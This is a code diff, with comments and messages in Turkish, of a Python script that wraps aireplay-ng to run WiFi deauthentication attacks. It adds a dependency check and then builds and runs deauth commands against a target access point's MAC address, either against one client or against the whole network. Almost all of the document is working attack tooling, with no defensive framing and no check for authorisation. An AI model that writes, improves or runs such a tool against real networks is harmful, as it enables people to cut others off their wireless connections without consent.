@@ -63,22 +63,36 @@ def select_deauth_packet_count():
     return packet_count
 
 import subprocess
+import os
+
+def check_dependencies():
+    """Gerekli araçların yüklü olup olmadığını kontrol eder."""
+    try:
+        subprocess.run(["aireplay-ng", "--version"], check=True, capture_output=True, text=True)
+        return True
+    except FileNotFoundError:
+        print("[-] aireplay-ng bulunamadı. Lütfen aircrack-ng paketini kurun.")
+        print("  (Örneğin, Debian/Ubuntu için: sudo apt install aircrack-ng)")
+        return False
 
 def start_deauth_attack(target_mac, client_mac, packet_count):
-    # Paket sayısını doğrulama
+    # 1. Bağımlılıkları kontrol et
+    if not check_dependencies():
+        return  # Eğer bağımlılıklar yoksa, saldırıyı başlatma
+
+    # 2. Paket sayısını doğrula
     if not str(packet_count).isdigit():
-        print("[-] Invalid packet count, defaulting to 10.")
+        print("[-] Geçersiz paket sayısı, varsayılan olarak 10 kullanılıyor.")
         packet_count = 10
     else:
         packet_count = int(packet_count)
 
-    print(f"[*] Running attack with {packet_count} packets...")
+    print(f"[*] Saldırı {packet_count} paket ile başlatılıyor...")
 
+    # 3. Arayüzü belirle ve kontrol et
     interface = "wlan0mon"
-
-    # Arayüzü kontrol etme ve gerekirse başlatma
     try:
-        subprocess.run(["sudo", "iwconfig", interface], check=True, capture_output=True, text=True)
+        subprocess.run(["iwconfig", interface], check=True, capture_output=True, text=True)
         print(f"[+] {interface} arayüzü zaten mevcut.")
     except subprocess.CalledProcessError:
         print(f"[-] {interface} arayüzü bulunamadı, oluşturuluyor...")
@@ -87,25 +101,26 @@ def start_deauth_attack(target_mac, client_mac, packet_count):
             print(f"[+] {interface} başarıyla oluşturuldu.")
         except subprocess.CalledProcessError as e:
             print(f"[-] Arayüz oluşturulurken hata oluştu: {e}")
-            return  # Fonksiyondan çık, çünkü arayüz yoksa saldırı yapılamaz.
+            return  # Arayüz oluşturulamazsa, fonksiyonu sonlandır
 
-    # Hedeflenen cihaza saldırı mı, yoksa SSID’ye genel saldırı mı?
+    # 4. Saldırı komutunu oluştur
     if client_mac:
-        print(f"[*] Attacking {client_mac} in {target_mac} network...")
+        print(f"[*] {target_mac} ağındaki {client_mac} cihazına saldırılıyor...")
         command = ["sudo", "aireplay-ng", "--deauth", str(packet_count), "-a", target_mac, "-c", client_mac, "-i", interface, "--ignore-negative-one"]
     else:
-        print(f"[*] Attacking entire {target_mac} network (SSID focus)...")
+        print(f"[*] {target_mac} ağının tamamına saldırılıyor (SSID odaklı)...")
         command = ["sudo", "aireplay-ng", "--deauth", str(packet_count), "-a", target_mac, "-i", interface, "--ignore-negative-one"]
 
-    # Saldırıyı başlat ve çıktıyı al
+    # 5. Saldırıyı başlat ve çıktıyı al
     try:
         result = subprocess.run(command, capture_output=True, text=True, check=True)
-        print("[+] Attack successfully executed!")
-        print("[DEBUG] Command Output:", result.stdout)
+        print("[+] Saldırı başarıyla gerçekleştirildi!")
+        print("[DEBUG] Komut Çıktısı:", result.stdout)
     except subprocess.CalledProcessError as e:
-        print("[-] Error executing aireplay-ng! Check permissions or dependencies.")
-        print("[DEBUG] Command Output:", e.stdout)
-        print("[DEBUG] Command Error:", e.stderr)
+        print("[-] aireplay-ng çalıştırılırken hata oluştu! İzinleri veya bağımlılıkları kontrol edin.")
+        print("[DEBUG] Komut Çıktısı:", e.stdout)
+        print("[DEBUG] Komut Hatası:", e.stderr)
+
 
 
 # Ana akış
